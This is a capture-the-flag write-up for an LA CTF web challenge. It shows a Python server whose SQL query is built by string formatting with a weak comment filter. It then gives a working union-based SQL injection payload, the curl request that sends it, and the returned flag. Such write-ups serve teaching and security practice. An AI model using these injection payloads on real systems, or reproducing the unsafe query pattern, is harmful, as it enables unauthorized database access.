<h1> La housing portal </h1>

<p> This is a basic python web server that lets you search for a user in a sqlite database. We can see that the inputs are directly integrated into the sql query with a basic filtering process.</p>

<h3> Filter </h3>

```python
for k, v in list(data.items()):
    if v == 'na':
        data.pop(k)
    if (len(k) > 10 or len(v) > 50) and k != "name":
        return "Invalid form data", 422
    if "--" in k or "--" in v or "/*" in k or "/*" in v:
        return render_template("hacker.html")
```

<h3> Query </h3>

```python
query = """
select * from users where {} LIMIT 25;
""".format(
    " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
)
```

<p> In the database source code (<a href="src/data.sql"><i>data.sql</i></a>), we can see a table containing the test flag </p>

```sql
CREATE TABLE flag (
flag text
);
INSERT INTO flag VALUES("lactf{fake_flag}");
```

<p>So we can exploit the bad filtering to get a union-based sql injection. The only difficulty is that our payload must be less than 51 characters long and contain no comments. </p>
<p> This payload should satisfy these 2 constraints :  <strong><i>'UNION SELECT 1,flag,3,4,5,6 FROM flag WHERE ''='</i></strong></p>

```bash
$ curl -X POST -d "name=&guests=na&neatness=na&sleep=na&awake='UNION SELECT 1,flag,3,4,5,6 FROM flag WHERE ''='" https://la-housing.chall.lac.tf/submit

```
```html
<h2>Result for :</h2>
<table id="data" class="table table-striped">
  <thead>
    <tr>
      <th>Name</th>
      <th>Guests</th>
      <th>Neatness</th>
      <th>Sleep time</th>
      <th>Awake time</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>lactf{us3_s4n1t1z3d_1npu7!!!}</td>
      <td>3</td>
      <td>4</td>
      <td>5</td>
      <td>6</td>
    </tr>

  </tbody>
</table>
<a href="/">Back</a>

<style>
  * {
    border: 1px solid black; border-collapse: collapse;
  }
</style>

```
